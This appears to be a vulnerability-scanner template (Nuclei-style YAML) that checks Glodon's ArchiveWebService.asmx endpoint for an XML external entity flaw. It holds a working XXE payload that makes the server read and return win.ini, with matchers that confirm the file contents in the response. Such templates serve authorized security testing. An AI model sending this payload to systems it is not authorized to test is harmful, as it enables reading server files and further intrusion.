@@ -1,0 +1,62 @@
+id: glodon-archivewebservice-asmx-xxe
+info:
+  name: Glodon ArchiveWebService.asmx XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe
+http:
+  - raw:
+      - |
+        POST /GB/LK/Document/ArchiveService/ArchiveWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx/PostArchiveInfo"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <PostArchiveInfo xmlns="http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx">
+        <archiveInfo><!DOCTYPE Archive [
+        <!ENTITY secret SYSTEM "file:///windows/win.ini">
+        ]>
+
+        <Archive>  
+            <ArchiveInfo>  
+                <UploaderID>
+        ############
+
+
+        &secret;
+
+
+        ##############
+                </UploaderID>  
+            </ArchiveInfo>  
+            <Result>  
+                <MainDoc>Document Content</MainDoc>  
+            </Result>  
+            <DocInfo>  
+                <DocTypeID>1</DocTypeID>  
+                <DocVersion>1.0</DocVersion>  
+            </DocInfo>  
+        </Archive></archiveInfo>
+              <folderIdList>string</folderIdList>
+              <platId>string</platId>
+              </PostArchiveInfo>
+              </soap:Body>
+              </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "[files]"
+      - type: word
+        words:
+          - "; for 16-bit app support"
+      - type: word
+        words:
+          - "text/xml"
+        part: header
